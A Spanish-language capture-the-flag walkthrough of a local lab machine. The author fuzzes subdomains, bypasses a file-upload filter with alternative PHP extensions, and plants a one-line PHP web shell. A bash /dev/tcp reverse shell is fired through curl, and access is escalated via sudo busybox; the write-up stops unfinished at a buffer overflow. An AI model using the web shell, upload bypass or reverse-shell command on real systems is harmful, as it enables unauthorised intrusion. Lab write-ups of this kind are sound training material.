## FASE DE ENUMERACIÓN
Hacemos un escaneo de puertos y servicios de la IP 
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
```
ORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
solo tenemos el puerto 80 abierto, mirammos con herramientas como whatweb etc y no veo nada interesante, me voy a la página y veo esta parte:
```
The default Debian document root is /var/www/5eEk3r
```
así pues empiezo a pensar en virtual hosting, así pues ejecuto lo siguiente:
```bash
sudo nano /etc/hosts
```
y añadp esta línea al final:
```bash
172.17.0.2      5eEk3r
```
después de realizar fuzzing de directorios y extensiones y no encontrar nada veo esta parte en el index.html:
```
The default Debian document root is /var/www/5eEk3r. You can make your own virtual hosts under /var/www.
```
así pues lo añado al etc/hosts
```bash
sudo nano /etc/hosts
```
```
172.17.0.2      5eEk3r www.5eEk3r
```
y lo abro en el navegador, dádome esto:
```
Apache/2.4.62 (Debian) Server at 5eEk3r.dl Port 80
```
así pues añadimos de nuevo en el /etc/hosts lo encontrado:
```bash
sudo nano /etc/hosts
```
```
172.17.0.2      5eEk3r www.5eEk3r 5eEk3r.dl
```
y viendo por donde van los tiros, voy a fuzzear si hay más subdomkinios:
```bash
wfuzz -c --hc=404 --hh=10705 -w /opt//SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.5eek3r.dl" http://5eek3r.dl | tee dominios
```
## Explicación del comando:
1- wfuzz: Herramienta de fuzzing utilizada para buscar subdominios.

2- -c: Activar la coloración de salida en la terminal.

3- --hc=404: Ignorar respuestas con código de estado 404 (no encontrado).

4- --hh=10705: Ignorar respuestas con un tamaño de encabezado HTML de 10705 bytes.

5- -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt: Ruta al diccionario de subdominios a utilizar.

6- -H "Host: FUZZ.5eek3r.dl": Utiliza el encabezado Host con el marcador de posición FUZZ que será reemplazado por las entradas del diccionario.

7- http://5eek3r.dl: URL base a la que se realizarán las solicitudes.

8- | tee dominios: Redirige la salida tanto a la terminal como a un archivo llamado dominios.

Este comando realizará el fuzzing en busca de subdominios válidos de 5eek3r.dl utilizando el diccionario proporcionado, ignorando ciertos códigos de estado y tamaños de respuesta.
Los resultados serán guardados en el archivo dominios y también se mostrarán en la terminal.


obetengo como resultado:
```
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://5eek3r.dl/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000009532:   400        10 L     35 W       301 Ch      "#www"                                                                                                                                                                      
000010581:   400        10 L     35 W       301 Ch      "#mail"                                                                                                                                                                     
000042993:   200        101 L    75 W       932 Ch      "crosswords"
```
un 200 ok, pues lo introduzco en el /etc/hosts de nuevo, quedándome así:

```
172.17.0.2      5eEk3r www.5eEk3r 5eEk3r.dl crosswords.5eEk3r.dl
```

hago un fuzzing su solo encuentro index.php, miro su código fuente y al final veo esto:
```
http://crosswords.5eek3r.dl/index.php/
```
```
<! -- Al que contratamos para crear la web nos habló de algo llamado 'xss'... que será? -->
```

despues ver lograr inyectar un XSS y dar mil vueltas me doy cuenta que es un rabbithole, así pues me pongo a buscar más,
me acordé del tema de los dominios y volví a ellos.
```bash
wfuzz -c --hc=404 --hh=10705 -w /opt//SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.crosswords.5eEk3r.dl" http://5eek3r.dl
```
```
000000024:   200        103 L    189 W      2906 Ch     "admin"
```
así pués lo añadimos de nuevo al /etc/hosts, nuevo domion admin.crosswords.5eEk3r.dl

## FASE DE INTRUSIÓN:

vamos a la página y vemos un panel interesante, dónde puedo subir archivos, subo un archivo en php y me dice:
```
No se permiten archivos PHP, solo HTML.
```
voy a probar con varias extensiones de php con un pequeño diccionario y burpsuite:
```
php
phps
phar
pht
phtm
phtml
pgif
shtml
php2
php3
php4
php
php6
php7
phps
phps
pht
phtm
phtml
pgif
shtml
htaccess
phar
inc
hphp
ctp
module
```
el contenido algo sencillito:
```bash
<?php system($_GET['cmd']); ?>
```
y...entraron varias xD
hago una busqueda y parece ser que aquí no se han subido los archivos, así pues empiezo a mirar en los otros subdominios
y efectivamente en http://crosswords.5ee3r.dl están alojados, al menos "shell.phar" es verdad que de todos los subidos algunos no estaban:
así pues con nuestro amigo curl vamos a intentar hacernos una reverseshell, usaremos este payload:
```
bash -c 'bash -i >& /dev/tcp/172.17.0.1/445 0>&1'
```
pero hay que encodearlo para que de menos problemas y hacemos la peticion con curl:
```bash
curl "http://crosswords.5eek3r.dl/shell.phar?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F445%200%3E%261%27"
```
Por fin estamos dentro.

## ESCALADA DE PRIVILEGIOS


Lo primero tratamiento de la TTY:
```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 51 columns 237
```
primero miro si estoy en algún grupo con priviegios y nada, luego las variables de entorno y nada, pruebo:
```bash
sudo -l
```
```
User www-data may run the following commands on dockerlabs:
    (astu : astu) NOPASSWD: /usr/bin/busybox
```
miro en :
```bash
https://gtfobins.github.io/gtfobins/busybox/#sudo
```
información sobre el binario y ejecutando esto deberia escalar al usuario astu:
```bash
sudo -u astu /usr/bin/busybox sh
```

Ya somos astu, volvemos a mirar con "id" si estamos en algun grupo privilegiado, no es así, variable de entorno,
nada, sudo -l no tenemos credenciales, así pues toca mirar que podemos encontrar.
vamos al home de astu y hay una carpeta con un binario.
lo ejecutamos :
```bash
./bs64
```
Ingrese el texto: sadasd
c2FYXN
```
pues vamos a probar a ver si se trata de un bof:
```
./bs64
Ingrese el texto: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
YWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYW=
Segmentation fault
```
Segmentation fault, se trata de un bof.

y hasta aquí he llegado porque no se hacer bof xD... tendré que ponerme a ello en un futuro.

